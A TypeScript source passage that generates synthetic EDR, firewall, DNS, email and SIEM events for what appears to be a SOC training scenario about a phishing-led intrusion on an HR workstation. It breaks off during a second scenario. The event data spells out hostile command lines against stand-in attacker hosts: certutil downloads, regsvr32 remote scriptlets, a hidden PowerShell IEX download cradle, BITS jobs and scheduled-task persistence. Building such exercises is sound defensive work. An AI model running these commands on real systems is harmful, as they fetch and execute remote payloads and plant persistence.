  const outlook = mk("OUTLOOK.EXE", 2960, `${officeDir}\\OUTLOOK.EXE`, "explorer.exe", 3280, `"${officeDir}\\OUTLOOK.EXE"`);
  const word = mk("WINWORD.EXE", 3308, `${officeDir}\\WINWORD.EXE`, "OUTLOOK.EXE", 2960, `"${officeDir}\\WINWORD.EXE" /n "${docmPath}" /o ""`);
  const cmd = mk("cmd.exe", 4420, "C:\\Windows\\System32\\cmd.exe", "WINWORD.EXE", 3308, "cmd.exe /k");
  const certutil = mk("certutil.exe", 4440, "C:\\Windows\\System32\\certutil.exe", "cmd.exe", 4420, "certutil -urlcache -split -f http://pkg-mirror-eu.ru/update.exe update.exe", { hash: { sha256: certutilBinaryHash } });
  const updateExe = mk("update.exe", 4460, "C:\\Users\\s.patel\\Downloads\\update.exe", "cmd.exe", 4420, "update.exe", { hash: { sha256: certutilHash } });
  const regsvr32 = mk("regsvr32.exe", 5512, "C:\\Windows\\System32\\regsvr32.exe", "cmd.exe", 4420, "regsvr32 /s /u /i:http://cdn-winupd.ru/tpl/upd.sct scrobj.dll");
  const mshta = mk("mshta.exe", 6100, "C:\\Windows\\System32\\mshta.exe", "regsvr32.exe", 5512,
    "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://cdn-winupd.ru/stage2.ps1')\"\",0:close\")");
  const ps = mk("powershell.exe", 6200, psPath, "mshta.exe", 6100, stage2Cmd);
  const wmic = mk("wmic.exe", 6540, "C:\\Windows\\System32\\wbem\\wmic.exe", "powershell.exe", 6200, "wmic process list brief");
  const bits = (pid: number, args: string) => mk("bitsadmin.exe", pid, "C:\\Windows\\System32\\bitsadmin.exe", "powershell.exe", 6200, `bitsadmin ${args}`);
  const rundll = mk("rundll32.exe", 7480, "C:\\Windows\\System32\\rundll32.exe", "powershell.exe", 6200, "rundll32.exe C:\\Users\\Public\\srvhost.dll,Start", { hash: { sha256: rundll32BinaryHash } });
  const schtasks = mk("schtasks.exe", 7900, "C:\\Windows\\System32\\schtasks.exe", "powershell.exe", 6200, `schtasks /create /tn "${task}" /tr "${taskCmd}" /sc minute /mo 5 /f`);
  // Services the OS keeps running: the BITS service and the Task Scheduler service run inside svchost.exe.
  const services = sys("services.exe", 716, "C:\\Windows\\System32\\services.exe", "wininit.exe", 640, "C:\\Windows\\system32\\services.exe");
  const svcBits = sys("svchost.exe", 1468, "C:\\Windows\\System32\\svchost.exe", "services.exe", 716, "C:\\Windows\\system32\\svchost.exe -k netsvcs -p");
  const persist = (pid: number) => mk("svchost_update.exe", pid, taskCmd, "svchost.exe", 1468, taskCmd, { hash: { sha256: bitsPayloadHash } });

  // ── helpers ─────────────────────────────────────────────────────────────────
  const mde = (id: string, at: number, type: TelemetryEvent["event_type"], p: P, description: string, action: string, over: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(at),
    source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: type,
    hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
    severity: "informational",
    process: p, description,
    raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": victimHost, "ActionType": action },
    ...over,
  });
  const proc = (id: string, at: number, p: P, description: string, over: Partial<TelemetryEvent> = {}) => mde(id, at, "process_create", p, description, "ProcessCreated", over);
  const net = (id: string, at: number, p: P, dst: string, port: number, url: string | undefined, bytesIn: number | undefined, description: string, over: Partial<TelemetryEvent> = {}) =>
    mde(id, at, "net_connection", p, description, "ConnectionSuccess", {
      dst_ip: dst, dst_port: port, protocol: "tcp",
      ...(url ? { network: { url, domain: url.replace(/^https?:\/\//, "").split("/")[0], method: "GET", ...(bytesIn ? { bytes_in: bytesIn } : {}) } } : {}),
      ...over,
    });
  const file = (id: string, at: number, p: P, f: NonNullable<TelemetryEvent["file"]>, description: string, over: Partial<TelemetryEvent> = {}) =>
    mde(id, at, "file_create", p, description, "FileCreated", { file: f, ...over });
  /** A PAN-OS session as logged when it ends. */
  const fw = (id: string, at: number, sport: number, dst: string, dport: number, host: string, description: string, bytesOut: number, bytesIn: number, elapsed: number, over: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(at),
    source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
    hostname: victimHost, src_ip: victimIp, dst_ip: dst, dst_port: dport, src_port: sport, protocol: "tcp",
    severity: "medium", network: { bytes_out: bytesOut, bytes_in: bytesIn },
    description: `${description.replace(/\.$/, "")} (source port ${sport}).`,
    raw: {
      "event.action": "allow", "source.ip": victimIp, "destination.ip": dst, "destination.port": String(dport),
      "destination.host": host,
      "pan.app": dport === 443 ? "ssl" : "web-browsing", "pan.action": "allow", "pan.rule": dport === 443 ? "ALLOW-OUTBOUND-HTTPS" : "ALLOW-OUTBOUND-HTTP",
      "url.category": "Unknown/Uncategorized", "pan.elapsed_time": String(elapsed),
      "network.bytes_out": String(bytesOut), "network.bytes_in": String(bytesIn), "action_result": "allow",
    },
    ...over,
  });
  const dnsRow = (id: string, at: number, name: string, ip: string): TelemetryEvent => ({
    id, ts: T(at),
    source: "dns", vendor: "Windows DNS Server", event_type: "dns_query",
    hostname: victimHost, src_ip: victimIp,
    severity: "low",
    dns: { query: name, query_type: "A", response: ip, rcode: "NOERROR" },
    description: `The internal DNS server answered ${victimHost}'s A query for ${name} with ${ip}.`,
    raw: { "dns.question.name": name, "dns.question.type": "A", "dns.response_code": "NOERROR", "dns.resolved_ip": ip, "source.ip": victimIp },
  });

  const events: TelemetryEvent[] = [
    // ── Context: the host's services (up since boot) and the user's session ─────────────────
    proc("evt_lol_ctx_services", -4 * 24 * 60 * MIN - 180 * MIN, services, "services.exe started on WS-HR-1133 at boot.", { is_baseline: true, user_email: undefined }),
    proc("evt_lol_ctx_bits", -4 * 24 * 60 * MIN - 180 * MIN + 10 * SEC, svcBits, "services.exe started the shared service host (svchost.exe -k netsvcs, which runs BITS and the Task Scheduler) on WS-HR-1133 at boot.", { is_baseline: true, user_email: undefined }),
    {
      id: "evt_lol_ctx_logon", ts: T(-133 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "informational",
      description: "s.patel logged on interactively to WS-HR-1133.",
      raw: {
        "winlog.event_id": "4624", "winlog.channel": "Security", "winlog.computer_name": victimHost,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.TargetUserName": "s.patel", "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "2", "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Kerberos", "winlog.event_data.WorkstationName": victimHost,
        "winlog.event_data.IpAddress": victimIp, "winlog.event_data.IpPort": "0", "event.code": "4624",
      },
    },
    proc("evt_lol_ctx_userinit", -133 * MIN + 6 * SEC, userinit, "winlogon.exe started userinit.exe for s.patel's session on WS-HR-1133."),
    proc("evt_lol_ctx_explorer", -133 * MIN + 12 * SEC, explorer, "userinit.exe started explorer.exe for s.patel's session on WS-HR-1133."),
    proc("evt_lol_ctx_outlook", -132 * MIN, outlook, "explorer.exe started Outlook for s.patel on WS-HR-1133."),
    // What certutil looks like when it is used the normal way: an autoenrollment task, three days earlier.
    {
      ...proc("evt_lol_baseline_certutil", -3 * 24 * 60 * MIN - 106 * MIN,
        sys("certutil.exe", 5196, "C:\\Windows\\System32\\certutil.exe", "svchost.exe", 1468, "certutil.exe -pulse"),
        "The certificate autoenrollment task ran certutil -pulse on WS-HR-1133 three days earlier; certutil has not been used with -urlcache on this host before.", { is_baseline: true, user_email: undefined }),
    },

    // ── T-2min: the phishing email, and the document opening ────────────────────────
    {
      id: "evt_lol_00_phish", ts: T(-2 * MIN),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victimEmail, src_ip: mailIp,
      severity: "high", mitre_technique: "T1566.001", mitre_tactic: "Initial Access",
      description: "s.patel received an email with a macro-enabled Word attachment (HR_Policy_Update.docm) from a domain registered 4 days ago. SPF and DKIM both failed; a transport rule allowed delivery.",
      raw: {
        "event.action": "EmailDelivered", "event.outcome": "success",
        "email.from.address": "hr-updates@nexacorp-portal.ru",
        "email.to.address": victimEmail,
        "email.subject": "HR Policy Update - Acknowledge by EOD",
        "email.attachment.name": "HR_Policy_Update.docm",
        "email.direction": "inbound",
        "file.size": "38912",
        "source.ip": mailIp,
        "spf.result": "fail", "dkim.result": "fail",
        "action_result": "delivered",
        "data.office365.OrgLevelAction": "Allow", "data.office365.OrgLevelPolicy": "Exchange transport rule",
      },
    },
    {
      // The attachment row of the same message: the document's SHA256 (EmailEvents has no hash column).
      id: "evt_lol_00a_attachment", ts: T(-2 * MIN),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victimEmail,
      severity: "informational",
      description: "The message's attachment record lists HR_Policy_Update.docm (38,912 bytes) with its SHA256.",
      raw: {
        "category": "AdvancedHunting-EmailAttachmentInfo",
        "email.from.address": "hr-updates@nexacorp-portal.ru",
        "email.to.address": victimEmail,
        "email.subject": "HR Policy Update - Acknowledge by EOD",
        "email.attachments.file.name": "HR_Policy_Update.docm",
        "email.attachments.file.hash.sha256": docmHash,
        "email.attachments.file.size": 38912,
        "email.direction": "inbound",
        "source.ip": mailIp,
        "action_result": "delivered",
      },
    },
    file("evt_lol_00b_docm_saved", -75 * SEC, outlook, { path: docmPath, sha256: docmHash, size: 38_912 },
      "OUTLOOK.EXE saved HR_Policy_Update.docm to the Outlook attachment cache when s.patel opened it."),
    proc("evt_lol_00c_word", -55 * SEC, word, "OUTLOOK.EXE started WINWORD.EXE with HR_Policy_Update.docm on WS-HR-1133."),
    // T-30s: the macro starts a command shell (T1204.002)
    proc("evt_lol_00b_macro_cmd", -30 * SEC, cmd, "WINWORD.EXE spawned a command shell on the HR workstation WS-HR-1133.",
      { severity: "high", mitre_technique: "T1204.002", mitre_tactic: "Execution", raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": victimHost, "ActionType": "ProcessCreated", "ReportId": "9284492" } }),
    dnsRow("evt_lol_dns_pkg", -2 * SEC, "pkg-mirror-eu.ru", mailIp),

    // ── T+0: certutil downloads the first payload (T1105) ─────────────────────────
    proc("evt_lol_01_certutil", 0, certutil, "certutil.exe, spawned from cmd.exe, was run with -urlcache -split -f against http://pkg-mirror-eu.ru/update.exe on WS-HR-1133.",
      { severity: "high", mitre_technique: "T1105", mitre_tactic: "Command and Control", raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": victimHost, "ActionType": "ProcessCreated", "ReportId": "9284512" } }),
    net("evt_lol_01a_certutil_net", 500, certutil, mailIp, 80, "http://pkg-mirror-eu.ru/update.exe", 204_800, "certutil.exe on WS-HR-1133 connected to pkg-mirror-eu.ru (87.121.84.207) and received 204,800 bytes.", { severity: "medium" }),
    fw("evt_lol_certutil_net", 0, 50233, mailIp, 80, "pkg-mirror-eu.ru",
      "WS-HR-1133 opened an outbound HTTP session to pkg-mirror-eu.ru (87.121.84.207:80), allowed by rule ALLOW-OUTBOUND-HTTP.", 640, 204_800, 4,
      { severity: "high", mitre_technique: "T1105" }),
    file("evt_lol_01b_write", 800, certutil, { path: "C:\\Users\\s.patel\\Downloads\\update.exe", sha256: certutilHash, size: 204_800 },
      "certutil.exe wrote update.exe (204,800 bytes) to s.patel's Downloads folder.", { severity: "medium" }),
    // ── CORRELATED: Defender saw the file and did not remediate it ─────────────────────
    {
      id: "evt_lol_av_evade", ts: T(1_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint",
      event_type: "av_detection", severity: "medium",
      hostname: victimHost, user_email: victimEmail,
      description: "Microsoft Defender Antivirus detected Trojan:Win32/Wacatac.B!ml in update.exe; the file was not remediated.",
      raw: {
        "event.action": "DefenderDetection",
        "file.path": "C:\\Users\\s.patel\\Downloads\\update.exe",
        "file.hash.sha256": certutilHash,
        "file.name": "update.exe",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
        "windefend.threat.name": "Trojan:Win32/Wacatac.B!ml",
        "action_result": "allowed",
        "quarantine.status": "not_quarantined",
      },
    },
    proc("evt_lol_01c_update_run", 40 * SEC, updateExe, "cmd.exe started update.exe from s.patel's Downloads folder on WS-HR-1133.", { severity: "medium" }),

    // ── T+4min: regsvr32 loads a remote COM scriptlet (T1218.010) ───────────────────
    dnsRow("evt_lol_dns_cdn", 3 * MIN + 58 * SEC, "cdn-winupd.ru", c2Ip),
    proc("evt_lol_02_regsvr32", 4 * MIN, regsvr32, "regsvr32.exe ran with /i:http://cdn-winupd.ru/tpl/upd.sct, loading a COM scriptlet from a remote URL.",
      { severity: "critical", mitre_technique: "T1218.010", mitre_tactic: "Stealth", raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": victimHost, "ActionType": "ProcessCreated", "ReportId": "9284556" } }),
    net("evt_lol_02a_regsvr_conn", 4 * MIN + 500, regsvr32, c2Ip, 80, "http://cdn-winupd.ru/tpl/upd.sct", 8_192, "regsvr32.exe on WS-HR-1133 fetched http://cdn-winupd.ru/tpl/upd.sct.", { severity: "high" }),
    fw("evt_lol_regsvr_net", 4 * MIN + 5 * SEC, 50291, c2Ip, 80, "cdn-winupd.ru",
      "WS-HR-1133 fetched http://cdn-winupd.ru/tpl/upd.sct from 5.252.179.55:80, allowed by rule ALLOW-OUTBOUND-HTTP.", 590, 8_192, 2,
      { severity: "critical", mitre_technique: "T1218.010" }),

    // ── T+5min: the SIEM's rare-command-line detection on the certutil run ───────────────
    {
      id: "evt_lol_sentinel_alert", ts: T(5 * MIN + 10 * SEC),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "ids_signature",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "medium", mitre_technique: "T1105", mitre_tactic: "Command and Control", is_detection: true,
      description: "Microsoft Sentinel rule 'Rare certutil command line' matched one certutil.exe -urlcache run for s.patel on WS-HR-1133.",
      raw: {
        "AlertName": "Rare certutil command line",
        "AlertSeverity": "Medium",
        "ProductName": "Azure Sentinel",
        "ProviderName": "ASI Scheduled Alerts",
        "AlertType": "5d3a8f41-27c6-4b9e-a1d0-6c8e4f2b7a93_1e9b6d52-83a4-4c17-b5f0-2d7a9c4e6b18",
        "Status": "New",
        "Tactics": "CommandAndControl",
        "Techniques": "[\"T1105\"]",
        "CompromisedEntity": "s.patel",
        "ExtendedProperties.Query Period": "00:10:00",
        "ExtendedProperties.Number of events": 1,
        "ExtendedProperties.Process": "certutil.exe",
        "ExtendedProperties.Command line": "certutil -urlcache -split -f http://pkg-mirror-eu.ru/update.exe update.exe",
        "Entities": JSON.stringify([
          { $id: "2", HostName: victimHost, DnsDomain: "nexacorp.com", Type: "host" },
          { $id: "3", Name: "s.patel", NTDomain: "NEXACORP", Type: "account" },
        ]),
      },
    },

    // ── T+7min: mshta launches hidden PowerShell for stage 2 (T1218.005) ─────────────
    proc("evt_lol_03_mshta", 7 * MIN, mshta, "mshta.exe, spawned by regsvr32.exe, ran a VBScript that launched hidden PowerShell to fetch stage2.ps1.",
      { severity: "critical", mitre_technique: "T1218.005", mitre_tactic: "Stealth", raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": victimHost, "ActionType": "ProcessCreated", "ReportId": "9284601" } }),
    proc("evt_lol_03b_powershell", 7 * MIN + 20 * SEC, ps, "A hidden PowerShell process started under mshta.exe and downloaded stage2.ps1 into memory.",
      { severity: "high", mitre_technique: "T1059.001", mitre_tactic: "Execution", raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": victimHost, "ActionType": "ProcessCreated", "ReportId": "9284622" } }),
    net("evt_lol_03c_stage2_net", 7 * MIN + 21 * SEC, ps, c2Ip, 80, "http://cdn-winupd.ru/stage2.ps1", 12_288, "powershell.exe on WS-HR-1133 fetched http://cdn-winupd.ru/stage2.ps1 (12,288 bytes).", { severity: "high" }),
    fw("evt_lol_stage2_net", 7 * MIN + 22 * SEC, 50347, c2Ip, 80, "cdn-winupd.ru",
      "WS-HR-1133 fetched http://cdn-winupd.ru/stage2.ps1 from 5.252.179.55:80, allowed by rule ALLOW-OUTBOUND-HTTP.", 604, 12_288, 2),

    // ── T+10min: wmic enumerates processes (T1057) ─────────────────────────────────
    proc("evt_lol_04_wmic", 10 * MIN, wmic, "wmic.exe ran process list brief under the same PowerShell session, enumerating all running processes on WS-HR-1133.",
      { severity: "medium", mitre_technique: "T1057", mitre_tactic: "Discovery", raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": victimHost, "ActionType": "ProcessCreated", "ReportId": "9284648" } }),

    // ── T+13min: a BITS job that pulls the persistence binary and runs it on completion (T1197) ──
    // `bitsadmin /transfer` is a one-shot copy; a job that outlives the session is built with /create,
    // /addfile, /SetNotifyCmdLine and /resume, and the BITS service (inside svchost.exe -k netsvcs) does the transfer.
    proc("evt_lol_05_bitsadmin", 13 * MIN, bits(7002, `/create /download ${"NexaCorpUpdate"}`),
      "bitsadmin.exe created the BITS job NexaCorpUpdate on WS-HR-1133.",
      { severity: "high", mitre_technique: "T1197", mitre_tactic: "Persistence", raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": victimHost, "ActionType": "ProcessCreated", "ReportId": "9284702" } }),
    proc("evt_lol_05a_addfile", 13 * MIN + 5 * SEC, bits(7003, "/addfile NexaCorpUpdate http://cdn-winupd.ru/persistence.exe C:\\ProgramData\\nexacorp\\svchost_update.exe"),
      "bitsadmin.exe added http://cdn-winupd.ru/persistence.exe to the NexaCorpUpdate job with a destination in C:\\ProgramData\\nexacorp.", { severity: "high", mitre_technique: "T1197" }),
    proc("evt_lol_05b_notify", 13 * MIN + 10 * SEC, bits(7004, `/SetNotifyCmdLine NexaCorpUpdate ${taskCmd} NUL`),
      "bitsadmin.exe set a notify command line on the NexaCorpUpdate job pointing at C:\\ProgramData\\nexacorp\\svchost_update.exe.", { severity: "high", mitre_technique: "T1197" }),
    proc("evt_lol_05c_retry", 13 * MIN + 15 * SEC, bits(7005, "/SetMinRetryDelay NexaCorpUpdate 60"),
      "bitsadmin.exe set a 60-second minimum retry delay on the NexaCorpUpdate job."),
    proc("evt_lol_05d_resume", 13 * MIN + 20 * SEC, bits(7006, "/resume NexaCorpUpdate"),
      "bitsadmin.exe resumed the NexaCorpUpdate job.", { severity: "high" }),
    net("evt_lol_05e_bits_net", 13 * MIN + 25 * SEC, { ...svcBits, user: "NT AUTHORITY\\SYSTEM" }, c2Ip, 80, "http://cdn-winupd.ru/persistence.exe", 307_200,
      "The shared service host (BITS) on WS-HR-1133 fetched http://cdn-winupd.ru/persistence.exe (307,200 bytes).", { severity: "high" }),
    fw("evt_lol_persist_net", 13 * MIN + 26 * SEC, 50412, c2Ip, 80, "cdn-winupd.ru",
      "WS-HR-1133 fetched http://cdn-winupd.ru/persistence.exe from 5.252.179.55:80, allowed by rule ALLOW-OUTBOUND-HTTP.", 618, 307_200, 3),
    file("evt_lol_05f_write", 13 * MIN + 28 * SEC, svcBits, { path: taskCmd, sha256: bitsPayloadHash, size: 307_200 },
      "The shared service host (BITS) wrote svchost_update.exe (307,200 bytes) to C:\\ProgramData\\nexacorp.", { severity: "high" }),

    // ── T+15min: srvhost.dll is written, then loaded with rundll32 (T1218.011) ─────────────
    file("evt_lol_06a_dll_write", 15 * MIN + 10 * SEC, ps, { path: "C:\\Users\\Public\\srvhost.dll", sha256: payloadHash, size: 204_800, extension: ".dll" },
      "powershell.exe wrote srvhost.dll (204,800 bytes, unsigned) to C:\\Users\\Public.", { severity: "high" }),
    proc("evt_lol_06_rundll32", 16 * MIN, rundll, "rundll32.exe loaded an unsigned DLL (srvhost.dll) from C:\\Users\\Public, calling its Start export.",
      { severity: "critical", mitre_technique: "T1218.011", mitre_tactic: "Stealth", raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": victimHost, "ActionType": "ProcessCreated", "ReportId": "9284755" } }),
    net("evt_lol_06b_dll_net", 16 * MIN + 20 * SEC, rundll, c2Ip, 443, undefined, undefined, "rundll32.exe on WS-HR-1133 connected to 5.252.179.55 on TCP/443.", { severity: "high" }),
    fw("evt_lol_dll_net", 16 * MIN + 21 * SEC, 50466, c2Ip, 443, "cdn-winupd.ru",
      "WS-HR-1133 opened an outbound HTTPS session to 5.252.179.55:443, allowed by rule ALLOW-OUTBOUND-HTTPS.", 1_204, 4_096, 3),

    // ── T+20min: a scheduled task for the dropped binary (T1053.005) ─────────────────────
    proc("evt_lol_07_schtask", 20 * MIN, schtasks, "schtasks.exe created a task named NexaCorpHealthCheck that runs C:\\ProgramData\\nexacorp\\svchost_update.exe in s.patel's user context every 5 minutes.",
      { severity: "high", mitre_technique: "T1053.005", mitre_tactic: "Persistence", raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": victimHost, "ActionType": "ProcessCreated", "ReportId": "9284811" } }),
    {
      id: "evt_lol_07b_task_4698", ts: T(20 * MIN + SEC),
      source: "windows_security", vendor: "Windows Security", event_type: "scheduled_task",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "medium",
      description: "A scheduled task was created on WS-HR-1133 by s.patel (Security 4698): NexaCorpHealthCheck.",
      raw: {
        "winlog.event_id": "4698", "winlog.channel": "Security", "winlog.computer_name": victimHost,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.SubjectUserName": "s.patel", "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.TaskName": `\\${task}`,
        "winlog.event_data.TaskContent": `<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><TimeTrigger><Repetition><Interval>PT5M</Interval></Repetition><StartBoundary>2026-05-25T11:20:00</StartBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Principals><Principal id="Author"><UserId>NEXACORP\\s.patel</UserId><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal></Principals><Actions Context="Author"><Exec><Command>${taskCmd}</Command></Exec></Actions></Task>`,
        "event.code": "4698",
      },
    },

    // ── T+25min onward: the task runs the dropped binary, and it calls out ────────────────────
    proc("evt_lol_08_persist_run1", 25 * MIN, persist(8120), "The shared service host (Task Scheduler) started svchost_update.exe from C:\\ProgramData\\nexacorp on WS-HR-1133.", { severity: "high" }),
    net("evt_lol_08a_persist_net1", 25 * MIN + 6 * SEC, persist(8120), c2Ip, 443, "https://cdn-winupd.ru/c/7f3a", undefined, "svchost_update.exe (pid 8120) on WS-HR-1133 connected to 5.252.179.55 on TCP/443.", { severity: "high" }),
    fw("evt_lol_beacon_1", 25 * MIN + 7 * SEC, 50612, c2Ip, 443, "cdn-winupd.ru",
      "WS-HR-1133 opened an outbound HTTPS session to 5.252.179.55:443, allowed by rule ALLOW-OUTBOUND-HTTPS.", 1_188, 4_096, 3),
    proc("evt_lol_08_persist_run2", 30 * MIN, persist(8244), "The shared service host (Task Scheduler) started svchost_update.exe again, five minutes after the first run, on WS-HR-1133.", { severity: "high" }),
    net("evt_lol_08a_persist_net2", 30 * MIN + 6 * SEC, persist(8244), c2Ip, 443, "https://cdn-winupd.ru/c/b91e", undefined, "svchost_update.exe (pid 8244) on WS-HR-1133 connected to 5.252.179.55 on TCP/443.", { severity: "high" }),
    fw("evt_lol_beacon_2", 30 * MIN + 7 * SEC, 50731, c2Ip, 443, "cdn-winupd.ru",
      "WS-HR-1133 opened an outbound HTTPS session to 5.252.179.55:443, allowed by rule ALLOW-OUTBOUND-HTTPS.", 1_204, 4_100, 3),
  ];
  // Chronological: the integrity gate and the page both read the story in clock order.
  events.sort((a, b) => Date.parse(a.ts) - Date.parse(b.ts));

  return { title: "Rare command-line alert on an HR workstation", events, T, MIN, payloadHash, certutilHash, bitsPayloadHash, docmHash, c2Ip, mailIp };
}

/** Telemetry half of `buildPhishingMalwareScenario`: the events and the story title, no answer key. */
export function phishingMalwareScenarioEvents() {
  const B = new Date("2026-05-20T10:15:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const AT = (hms: string) => new Date(`2026-05-20T${hms}Z`).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-HR-1182", email: "r.avraham@nexacorp.com", ip: "10.10.40.63" };
  const egress = "217.177.80.10"; // the company's NAT egress (what SaaS and the proxy see)
  const c2Domain = "shiptrack-updates-net.xyz";
  // Story-specific infrastructure (no other storyline uses these addresses).
  const c2Ip = "194.26.135.88";
  const senderIp = "146.70.53.21";
  const senderDomain = "shiptrack-express.info";
  const msgId = "<3f8b2a71-shiptrack-delivery-48213@shiptrack-express.info>";
  const fileHash = makeSha256("delivery_notice_48213_pdf_exe_trojan");
  const zipHash = makeSha256("delivery_notice_48213_zip_container");
  const zipPath = "C:\\Users\\r.avraham\\Downloads\\Delivery_Notice_48213.zip";
  const exePath = "C:\\Users\\r.avraham\\Downloads\\Delivery_Notice_48213\\Delivery_Notice_48213.pdf.exe";
  const chromeUa = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36";
  const mail = {
    "InternetMessageId": msgId,
    "email.from.address": "notifications@shiptrack-express.info",
    "email.to.address": victim.email,
    "email.subject": "Your Package Could Not Be Delivered - Action Required",
    "email.attachments.file.name": "Delivery_Notice_48213.zip",
    "email.attachments.file.hash.sha256": zipHash,
    "email.attachments.file.size": 18422,
    "email.direction": "inbound",
    "source.ip": senderIp,
  };
  // The user's interactive session: explorer.exe has run since logon, chrome.exe since the morning.
  const explorerProc = { name: "explorer.exe", pid: 3140, path: "C:\\Windows\\explorer.exe", user: "NEXACORP\\r.avraham", integrity: "medium" as const };
  const chromeProc = { name: "chrome.exe", pid: 5016, path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", parent_name: "explorer.exe", parent_pid: 3140, user: "NEXACORP\\r.avraham", integrity: "medium" as const };
  const payloadProc = {
    name: "Delivery_Notice_48213.pdf.exe", pid: 6624, parent_name: "explorer.exe", parent_pid: 3140,
    path: exePath, user: "NEXACORP\\r.avraham", integrity: "medium" as const, hash: { sha256: fileHash },
  };
  // Two more sessions to the same server after the first alert row (one beacon check-in, one larger POST).
  const c2Session = (id: string, ts: string, sport: number, bytesOut: number, bytesIn: number, elapsed: number): TelemetryEvent => ({
    id, ts,
    source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
    hostname: victim.hostname, user_email: victim.email,
    src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, src_port: sport, protocol: "tcp",
    severity: "medium",
    network: { bytes_out: bytesOut, bytes_in: bytesIn },
    description: `A second and third HTTPS session from WS-HR-1182 to ${c2Ip} on port 443 after the first one; the later one sent ${bytesOut} bytes.`,
    raw: {
      "event.action": "network-connection-allowed", "event.outcome": "success",
      "source.ip": victim.ip, "source.port": String(sport),
      "destination.ip": c2Ip, "destination.port": "443",
      "network.protocol": "tcp", "network.transport": "tcp",
      "pan.app": "ssl", "pan.action": "allow", "pan.rule": "Outbound-Web-Users",
      "pan.category": "newly-registered-domain", "pan.elapsed_time": String(elapsed), "pan.session_end_reason": "tcp-fin",
      "network.bytes_out": String(bytesOut), "network.bytes_in": String(bytesIn),
      "action_result": "allow",
    },
  });

  const events: TelemetryEvent[] = [
    {
      // Before the incident: the shell the user has been working in since logon.
      id: "evt_pm_00a_shell", ts: AT("08:02:10"), is_baseline: true,
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "informational",
      process: { ...explorerProc, parent_name: "userinit.exe", parent_pid: 2892, cmdline: "C:\\Windows\\Explorer.EXE" },
      description: "explorer.exe started for r.avraham's interactive session on WS-HR-1182 after logon.",
      raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "host.name": victim.hostname, "user.name": "NEXACORP\\r.avraham" },
    },
    {
      id: "evt_pm_00b_browser", ts: AT("09:48:30"), is_baseline: true,
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "informational",
      process: { ...chromeProc, cmdline: "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"" },
      description: "r.avraham opened Chrome on WS-HR-1182 from the desktop.",
      raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "host.name": victim.hostname, "user.name": "NEXACORP\\r.avraham" },
    },
    {
      id: "evt_pm_01_email", ts: T(0),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victim.email, src_ip: senderIp,
      severity: "medium", mitre_technique: "T1566.001",
      description: "r.avraham received an email with a ZIP attachment (Delivery_Notice_48213.zip) from an external sender (notifications@shiptrack-express.info) that failed SPF, DKIM and DMARC; it was delivered to the inbox.",
      raw: {
        ...mail,
        "event.action": "EmailDelivered", "event.outcome": "success",
        "spf.result": "fail", "dkim.result": "fail", "dmarc.result": "fail",
        "action_result": "delivered",
      },
    },
    {
      // The attachment row of the same message - the ZIP's SHA256 (EmailEvents has no hash column).
      id: "evt_pm_01b_attachment", ts: T(0),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victim.email,
      severity: "informational", mitre_technique: "T1566.001",
      description: "The message's attachment record lists Delivery_Notice_48213.zip (18,422 bytes) with its SHA256.",
      raw: { ...mail, "category": "AdvancedHunting-EmailAttachmentInfo", "action_result": "delivered" },
    },
    {
      // The user opens the message in Outlook on the web: the mailbox audit shows the bind of that one item.
      id: "evt_pm_01e_mail_open", ts: T(4 * MIN + 40_000),
